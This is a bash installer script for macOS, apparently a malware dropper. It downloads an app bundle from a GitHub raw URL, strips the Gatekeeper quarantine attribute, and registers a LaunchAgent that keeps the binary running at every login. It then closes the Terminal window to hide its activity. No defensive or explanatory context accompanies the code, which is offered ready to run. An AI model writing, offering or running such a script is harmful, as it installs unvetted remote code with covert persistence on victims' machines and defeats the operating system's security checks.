#!/bin/bash

# Define persistent target directories
INSTALL_DIR="$HOME/Library/Application Support/autotunagents"
LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
PLIST_NAME="com.user.autotunagent.plist"

# Create target directories if they don't exist
mkdir -p "$INSTALL_DIR"
mkdir -p "$LAUNCH_AGENTS_DIR"

# Download the zip archive
ZIP_PATH="$INSTALL_DIR/AgentInstaller.app.zip"
URL="https://github.com/rustdev55/rasb/raw/refs/heads/main/AgentInstaller.app.zip"

echo "Downloading AgentInstaller..."
curl -L "$URL" -o "$ZIP_PATH"

# Unzip the application archive into the install directory
echo "Extracting archive..."
unzip -q "$ZIP_PATH" -d "$INSTALL_DIR"

# Remove the zip file to clean up clutter
rm "$ZIP_PATH"

# Point directly to the inner launcher executable inside the extracted .app bundle
# (Adjust 'launcher' if your app bundle uses a different executable name inside Contents/MacOS)
TARGET_PATH="$INSTALL_DIR/AgentInstaller.app/Contents/MacOS/launcher"

# Set permissions and strip Gatekeeper quarantine from the app bundle and its executable
chmod +x "$TARGET_PATH"
xattr -cr "$INSTALL_DIR/AgentInstaller.app"

# Create the LaunchAgent plist for persistence on every boot/login
PLIST_PATH="$LAUNCH_AGENTS_DIR/$PLIST_NAME"

cat << EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.autotunagent</string>
    <key>ProgramArguments</key>
    <array>
        <string>$TARGET_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

# Load the LaunchAgent immediately so it starts right now without rebooting
launchctl unload "$PLIST_PATH" 2>/dev/null
launchctl load "$PLIST_PATH"

echo "Installation and persistence setup complete!"
osascript -e 'tell application "Terminal" to close front window'
